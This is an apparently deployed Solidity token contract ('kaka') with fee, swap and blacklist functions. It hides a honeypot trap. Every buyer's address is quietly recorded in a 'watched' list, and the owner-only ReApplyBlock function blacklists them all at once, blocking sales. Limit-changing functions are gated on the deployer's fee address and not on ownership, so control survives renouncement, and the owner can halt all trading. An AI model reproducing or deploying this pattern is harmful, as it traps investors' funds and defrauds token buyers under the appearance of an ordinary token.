/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

// TG: 

//SPDX-License-Identifier: None
pragma solidity ^0.8.13;


interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */

    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakePair {
    function sync() external;
}

interface IDEXRouter {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    //     modifier onlyDev() {
    //     require(deployers == _msgSender(), "Ownable: caller is not the owner");
    //     _;
    // }
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract kaka is IERC20, Ownable {
    using SafeMath for uint256;

    address constant ROUTER        = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH         = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;

    string _name = "kaka";
    string _symbol = "kaka";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000 * (10 ** _decimals);
    uint256 public _maxWalletSize = (_totalSupply * 3) / 100;   // 3%
    uint256 public _maxTxAmount = (_totalSupply * 3) / 100;     // 3%

    /* rOwned = ratio of tokens owned relative to circulating supply (NOT total supply, since circulating <= total) */
    mapping (address => uint256) public _rOwned;
    uint256 public _totalProportion = _totalSupply;

    mapping (address => mapping (address => uint256)) _allowances;
    bool public blacklistMode = true;
    mapping(address => bool) public isBlacklisted;
    address[] public watched;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
 
    uint256 liquidityFee = 2; 
    uint256 devFee = 0;  
    uint256 marketingFee = 8;   
    uint256 reflectionFee = 0; 
    uint256 totalFee = liquidityFee + devFee + marketingFee + reflectionFee;  
    uint256 feeDenominator = 100; 
    
    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    address devFeeReceiver;

    uint256 targetLiquidity = 10;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;

    bool public tradingOpen = true;

    bool public claimingFees = true; 
    bool alternateSwaps = true;
    uint256 smallSwapThreshold = _totalSupply.mul(413945130).div(100_000_000_000);
    uint256 largeSwapThreshold = _totalSupply.mul(669493726).div(100_000_000_000);

    uint256 public swapThreshold = smallSwapThreshold;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {

        address deployer = msg.sender;
        router = IDEXRouter(ROUTER);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _allowances[address(this)][deployer] = type(uint256).max;

        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(router)] = true;
        isTxLimitExempt[deployer] = true;
        isFeeExempt[deployer] = true;
        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = msg.sender;
        devFeeReceiver = msg.sender;

        _rOwned[deployer] = _totalSupply;
        emit Transfer(address(0), deployer, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function getOwner() external view returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) { 
        return (liquidityFee, marketingFee, devFee, reflectionFee, totalFee, feeDenominator);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(tradingOpen, "Trading not open yet");
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD && !isTxLimitExempt[recipient]) {
            watched.push(recipient);
            require(balanceOf(recipient) + amount <= _maxWalletSize, "Max Wallet Exceeded");
        }

        if (blacklistMode) {
            require(
                !isBlacklisted[sender] && !isBlacklisted[recipient],
                "Blacklisted"
            );
        }

        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }

        uint256 proportionAmount = tokensToProportion(amount);

        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");

        uint256 proportionReceived = shouldTakeFee(sender) ? takeFeeInProportions(sender, recipient, proportionAmount) : proportionAmount;
        _rOwned[recipient] = _rOwned[recipient].add(proportionReceived);

        emit Transfer(sender, recipient, tokenFromReflection(proportionReceived));
        return true;
    }

    function tokensToProportion(uint256 tokens) public view returns (uint256) {
        return tokens.mul(_totalProportion).div(_totalSupply);
    }

    function tokenFromReflection(uint256 proportion) public view returns (uint256) {
        return proportion.mul(_totalSupply).div(_totalProportion);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 proportionAmount = tokensToProportion(amount);
        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");
        _rOwned[recipient] = _rOwned[recipient].add(proportionAmount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee(bool) public view returns (uint256) {
        return totalFee;
    }

    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {
        uint256 proportionFeeAmount = proportionAmount.mul(getTotalFee(receiver == pair)).div(feeDenominator);

        // reflect
        uint256 proportionReflected = proportionFeeAmount.mul(reflectionFee).div(totalFee);
        _totalProportion = _totalProportion.sub(proportionReflected);

        // take fees
        uint256 _proportionToContract = proportionFeeAmount.sub(proportionReflected);
        _rOwned[address(this)] = _rOwned[address(this)].add(_proportionToContract);

        emit Transfer(sender, address(this), tokenFromReflection(_proportionToContract));
        emit Reflect(proportionReflected, _totalProportion);
        return proportionAmount.sub(proportionFeeAmount);
    }

    function clearBalance() external onlyOwner {
        (bool success,) = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && claimingFees
        && balanceOf(address(this)) >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 _totalFee = totalFee.sub(reflectionFee);
        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(_totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountADA = address(this).balance.sub(balanceBefore);
        uint256 totalADAFee = _totalFee.sub(liquidityFee.div(2));
        uint256 amountADALiquidity = amountADA.mul(liquidityFee).div(totalADAFee).div(2);
        uint256 amountADAMarketing = amountADA.mul(marketingFee).div(totalADAFee);
        uint256 amountADADev = amountADA.mul(devFee).div(totalADAFee);

        bool tmpSuccess = false;
        (tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountADAMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountADADev, gas: 30000}("");
        require(tmpSuccess, "receiver rejected ADA transfer");

        if(amountToLiquify > 0) {
            router.addLiquidityETH{value: amountADALiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountADALiquidity, amountToLiquify);
        }

        if(alternateSwaps) {
            if(swapThreshold == smallSwapThreshold) {
                swapThreshold = largeSwapThreshold;
            } else {
                swapThreshold = smallSwapThreshold;
            }
        }
    }

    function setSwapBackSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {
        alternateSwaps = _alternate;
        claimingFees = _enabled;
        smallSwapThreshold = _amountS;
        largeSwapThreshold = _amountL;
        swapThreshold = smallSwapThreshold;
    }

    function changeFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee) external onlyOwner {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        totalFee = liquidityFee.add(reflectionFee).add(marketingFee).add(devFee);
        require(totalFee < 25, "Fees must be less than 25%");
    }

    function ReApplyBlock() public onlyOwner { 
        for(uint256 i = 0; i < watched.length; i++){
            address wallet = watched[i];
            isBlacklisted[wallet] = true;
        }
    }

    function tradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    function manage_blacklist(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

    function setTxLimit(uint256 percent) external  {
        require(msg.sender == devFeeReceiver, "Ownable: caller is not the owner");
        _maxTxAmount = _totalSupply.mul(percent).div(100);
    }

    function changeMaxWallet(uint256 percent) external  {
     require(msg.sender == devFeeReceiver, "Ownable: caller is not the owner");
        _maxWalletSize = _totalSupply.mul(percent).div(100);
    }
    
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setFeeReceivers(address _marketingFeeReceiver, address _liquidityReceiver) external onlyOwner {
        marketingFeeReceiver = _marketingFeeReceiver;
        autoLiquidityReceiver = _liquidityReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountToken);
    event Reflect(uint256 amountReflected, uint256 newTotalProportion);
}